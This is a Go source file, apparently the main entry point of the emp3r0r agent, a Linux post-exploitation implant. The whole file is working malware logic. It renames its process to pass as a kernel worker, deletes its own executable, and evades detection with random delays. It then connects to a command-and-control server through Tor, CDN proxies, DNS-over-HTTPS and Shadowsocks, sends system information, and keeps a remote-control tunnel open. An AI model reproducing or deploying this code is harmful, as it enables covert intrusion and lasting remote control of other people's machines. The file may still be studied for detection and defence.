//go:build linux
// +build linux

package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
	"golang.org/x/sys/unix"
	"src.elv.sh/pkg/buildinfo"
	"src.elv.sh/pkg/lsp"
	"src.elv.sh/pkg/prog"
	"src.elv.sh/pkg/shell"
)

func main() {
	var err error

	replace := flag.Bool("replace", false, "Replace existing agent process")
	replace_agent := *replace == true
	verbose := flag.Bool("verbose", false, "Enable logging")
	version := flag.Bool("version", false, "Show version info")
	flag.Parse()

	// -replace specified in environment variable
	if os.Getenv("REPLACE_AGENT") != "" {
		replace_agent = true
	}

	// version
	if *version {
		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)

		return
	}

	// silent switch
	log.SetOutput(ioutil.Discard)
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
	if *verbose {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)

		// redirect everything to log file
		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
			agent.RuntimeConfig.AgentRoot),
			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
		if err != nil {
			log.Printf("error opening emp3r0r.log: %v", err)
		} else {
			log.SetOutput(f)
			defer f.Close()
			err = unix.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
			if err != nil {
				log.Fatalf("Cannot redirect stderr to log file: %v", err)
			}
		}
	}

	// rename our agent process to make it less suspecious
	self_path, err := os.Readlink("/proc/self/exe")
	if err != nil {
		self_path = os.Args[0]
	}
	osArgs := os.Args
	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
		util.RandInt(1, 20),
		util.RandInt(0, 6)))

	// run as elvish shell
	runElvsh := os.Getenv("ELVSH") == "TRUE"
	if runElvsh {
		os.Exit(prog.Run(
			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, osArgs,
			prog.Composite(
				&buildinfo.Program{}, &lsp.Program{},
				&shell.Program{})))
	}
	err = os.Remove(self_path)
	if err != nil {
		log.Printf("Error removing agent file from disk: %v", err)
	}

	// applyRuntimeConfig
	err = agent.ApplyRuntimeConfig()
	if err != nil {
		log.Fatalf("ApplyRuntimeConfig: %v", err)
	}

	// don't be hasty
	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)

	// mkdir -p UtilsPath
	// use absolute path
	// TODO find a better location for temp files
	if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
		}
	}

	// PATH
	agent.SetPath()

	// set HOME to correct value
	u, err := user.Current()
	if err != nil {
		log.Printf("Get user info: %v", err)
	} else {
		os.Setenv("HOME", u.HomeDir)
	}

	// extract bash
	err = agent.ExtractBash()
	if err != nil {
		log.Printf("[-] Cannot extract bash: %v", err)
	}
	if !util.IsExist(emp3r0r_data.DefaultShell) {
		emp3r0r_data.DefaultShell = "/bin/sh"
	}

	// remove *.downloading files
	err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
		if err == nil {
			if strings.HasSuffix(info.Name(), ".downloading") {
				os.RemoveAll(path)
			}
		}
		return nil
	})
	if err != nil {
		log.Printf("Cleaning up *.downloading: %v", err)
	}

	// if the agent's process name is not "emp3r0r"
test_agent:
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}

		// exit, leave the existing agent instance running
		if isAgentAlive() {
			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
				log.Println("Escalating privilege...")
			} else if !replace_agent {
				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
					os.Getppid(),
					os.Getpid())

				util.TakeASnap()
				goto test_agent
			}
		}

		// if agent is not responsive, kill it, and start a new instance
		// after IsAgentAlive(), the PID file gets replaced with current process's PID
		// if we kill it, we will be killing ourselves
		if proc.Pid != os.Getpid() {
			err = proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}

	// start socket listener
	go socketListen()

	// if CC is behind tor, a proxy is needed
	if tun.IsTor(emp3r0r_data.CCAddress) {
		// if CC is on Tor, CCPort won't be used since Tor handles forwarding
		// by default we use 443, so configure your torrc accordingly
		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
		if agent.RuntimeConfig.C2TransportProxy == "" {
			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
		}
		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
	} else {
		// parse C2 address
		// append CCPort to CCAddress
		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
	}
	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)

	// DNS
	if agent.RuntimeConfig.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			agent.RuntimeConfig.DoHServer,
			dns.DoHCache())
		if err != nil {
			log.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	upper_proxy := agent.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
	if agent.RuntimeConfig.CDNProxy != "" {
		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if agent.RuntimeConfig.DoHServer != "" {
			dns = agent.RuntimeConfig.DoHServer
		}
		go func() {
			for !tun.IsProxyOK(cdnproxyAddr) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
				if err != nil {
					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
	}

	// agent root
	if !util.IsExist(agent.RuntimeConfig.AgentRoot) {
		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0700)
		if err != nil {
			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
		}
	}

	// do we have internet?
	checkInternet := func(cnt *int) bool {
		if tun.HasInternetAccess() {
			// if we do, we are feeling helpful
			if *cnt == 0 {
				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
				ctx, cancel := context.WithCancel(context.Background())
				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature

				if agent.RuntimeConfig.UseShadowsocks {
					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
					agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
						agent.RuntimeConfig.ShadowsocksPort)

					// run ss w/wo KCP
					go agent.ShadowsocksC2Client()
					go agent.KCPClient() // KCP client will run when UseKCP is set
				}
			}
			return true

		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.C2TransportProxy) {
			*cnt++
			// we don't, just wait for some other agents to help us
			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
			if *cnt == 0 {
				ctx, cancel := context.WithCancel(context.Background())
				go func() {
					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
					err := agent.BroadcastServer(ctx, cancel, "")
					if err != nil {
						log.Fatalf("BroadcastServer: %v", err)
					}
				}()
				for ctx.Err() == nil {
					if agent.RuntimeConfig.C2TransportProxy != "" {
						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.C2TransportProxy)
						return true
					}
				}
			}
			return false
		}

		return true
	}
	i := 0
	for !checkInternet(&i) {
		log.Printf("[%d] Checking Internet connectivity...", i)
		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
	}

	// apply whatever proxy setting we have just added
	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(agent.RuntimeConfig.C2TransportProxy)
	if agent.RuntimeConfig.C2TransportProxy != "" {
		log.Printf("Using proxy: %s", agent.RuntimeConfig.C2TransportProxy)
	} else {
		log.Println("Not using proxy")
	}

connect:

	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
		agent.RuntimeConfig.CCIndicator != "" &&
		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not

		if !agent.IsCCOnline(agent.RuntimeConfig.C2TransportProxy) {
			log.Println("CC not online")
			time.Sleep(time.Duration(
				util.RandInt(
					agent.RuntimeConfig.IndicatorWaitMin,
					agent.RuntimeConfig.IndicatorWaitMax)) * time.Minute)
			goto connect
		}
	}
	log.Printf("Checking in on %s", emp3r0r_data.CCAddress)

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Printf("CheckIn error: %v, sleeping, will retry later", err)
		util.TakeASnap()
		goto connect
	}
	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	emp3r0r_data.CCMsgConn = conn
	if err != nil {
		log.Printf("Connect CC failed: %v, sleeping, will retry later", err)
		util.TakeASnap()
		goto connect
	}
	emp3r0r_data.KCPKeep = true
	log.Println("Connecting to CC NsgTun...")
	agent.CCMsgTun(ctx, cancel)
	log.Printf("CC MsgTun closed, reconnecting")
	goto connect
}

// listen on a unix socket, used to check if agent is responsive
func socketListen() {
	// if socket file exists
	if util.IsExist(agent.RuntimeConfig.SocketName) {
		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
		if isAgentAlive() {
			log.Fatalf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
		}
		err := os.Remove(agent.RuntimeConfig.SocketName)
		if err != nil {
			log.Fatalf("Failed to delete socket: %v", err)
		}
	}

	l, err := net.Listen("unix", agent.RuntimeConfig.SocketName)
	if err != nil {
		log.Fatal("listen error:", err)
	}

	for {
		fd, err := l.Accept()
		if err != nil {
			log.Fatal("accept error:", err)
		}
		go server(fd)
	}
}

// handle connections to our socket: tell them my PID
func server(c net.Conn) {
	for {
		buf := make([]byte, 512)
		nr, err := c.Read(buf)
		if err != nil {
			return
		}

		data := buf[0:nr]
		log.Println("Server got:", string(data))

		reply := fmt.Sprintf("emp3r0r running on PID %d", os.Getpid())
		_, err = c.Write([]byte(reply))
		if err != nil {
			log.Printf("Write: %v", err)
		}
	}
}

func isAgentAlive() bool {
	conn, err := net.Dial("unix", agent.RuntimeConfig.SocketName)
	if err != nil {
		log.Printf("Agent seems dead: %v", err)
		return false
	}
	return agent.IsAgentAlive(conn)
}
